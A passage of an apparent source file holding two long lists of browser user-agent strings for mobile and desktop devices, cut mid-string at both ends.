Redmi Note 7 Pro Build/PKQ1.181203.001) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g', 'Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36/null', 'Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SM-T585) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; arm_64; Android 7.0; A8) AppleWebKit/537.36 (KHTML like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.121.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A730F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; CAM-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; FLA-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; U683CL Build/U683CL_01.01.02; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Redmi S2 Build/PKQ1.181203.001) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.05 YaSearchBrowser/9.05', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone84;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5;FBCR/LMT]', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T211 Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.109 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1806) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.66 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; ru-ru; MI 8 Pro Build/PKQ1.180729.001) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g', 'Mozilla/5.0 (Linux; Android 6.0.1; OPPO A57t) AppleWebKit/537.36 (KHTML like Gecko) Chrome/73.0.3683.103 YaBrowser/19.4.3.352.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-N920L) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6013) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-N950F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.121.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; TRT-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/43.0.2357.65 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 OPR/55.0.2719.50560', 'Mozilla/5.0 (Linux; Android 5.1.1; HUAWEI KII-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; ASUS_X00QD) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-N920K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; Neffos X1 Lite) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850M) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; JMM-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; ZB500KL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; ZB602KL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J415FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; STK-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; BLN-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; K3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; BKK-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; MI PLAY Build/O11019) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g', 'Mozilla/5.0 (Linux; Android 9; SM-G9650) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31) AppleWebKit/537.36 (KHTML like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36 YaApp_Android/9.40 YaSearchBrowser/9.40', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; M5 Note) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36 ACHEETAHI/1', 'Mozilla/5.0 (Linux; Android 9; SM-M307F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone72;FBMD/iPhone;FBSN/iOS;FBSV/12.4.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBCR/Pelephone]', 'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; G8342) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; arm_64; Android 7.0; JMM-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.2.152.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 (Edition Yx)', 'Mozilla/5.0 (Linux; Android 9; Redmi Note 8) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; LND-AL30) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SNE-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-T561) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-N975U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GM1913) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 9; TECNO KC2 Build/PPR1.180610.011; en-us) AppleWebKit/537.36 (KHTML like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.2.1.41222AP', 'Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L21 Build/HUAWEIVNS-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 9; HRY-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; POT-LX1 Build/HUAWEIPOT-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 8.0.0; Lenovo K8 Plus) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36']
ugen2=['Mozilla/5.0 (Linux; Android 5.1; LYO-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.56 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25 (Edition Campaign 67)', 'Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-J337P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A605FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J701M) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; BLN-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-N950N) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; L270) AppleWebKit/537.36 (KHTML like Gecko) Chrome/71.0.3578.99 YaBrowser/19.1.2.337.01 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; PRA-TL10 Build/HONORPRA-TL10) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/13.0 YaBrowser/19.12.4.77.10 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 4.4.2; K016) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J730FM) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; RNE-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; YAL-L41) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; KSA-LX9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; IMPRESS CLICK) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; RE1 Build/O11019) AppleWebKit/537.36 (KHTML like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 YaApp_Android/9.50 YaSearchBrowser/9.50', 'Mozilla/5.0 (Linux; Android 9; ZTE Blade A7 2020) AppleWebKit/537.36 (KHTML like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; JMM-L22 Build/HUAWEIJMM-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 7.0; AGS-L09 Build/HUAWEIAGS-L09) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.90/apad YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 6.0; LG-K430) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SM-A260G Build/OPR6) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; moto x4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG-SM-J727A) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; U504TL Build/U452TL_01.01.02; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; LM-X420) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI) AppleWebKit/537.36 (KHTML like Gecko) Silk/75.3.60 like Chrome/75.0.3770.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-G360H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.172', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1719) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/58.0.2991.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-T560) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.66 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010 Build/PKQ1.180716.001; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z00AD) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; MYA-L41) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; Ilium X110 Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:52.9) Gecko/20100101 Goanna/3.4 Firefox/52.9 ArcticFox/27.9.19', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 (Edition Yx)', 'Mozilla/5.0 (Linux; Android 9; JSN-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/68.0.3440.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; moto g(8) plus) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; RMX1805) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; GM 8 d) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.120 Safari/537.36 Avast/77.2.2167.120', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3066.82', 'Mozilla/5.0 (Linux; Android 9; Moto Z3 Play) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A305F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.0.10) Gecko/20060911 SUSE/1.5.0.10-0.2 Firefox/52.7.0', 'Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/52.5.0', 'Mozilla/5.0 (Linux; Android 9; Mi 9 SE) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; RMX1821) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A910F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; JSN-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A105F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Pixel 3a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1613) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; ML12-M7SQC-KIDPAD Build/KTU84Q) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.109 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A105FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A705FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; XT1635-02) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.1; .NET4.0C; Zoom 3.6.0)', 'Mozilla/5.0 (Linux; U; Android 8.1.0; SM-A260F Build/OPR6; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 OPR/46.0.2254.145391', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 (Edition Campaign 34)', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Linux; U; Android 4.1.2; zh-cn; GT-S7572 Build/JZO54K) 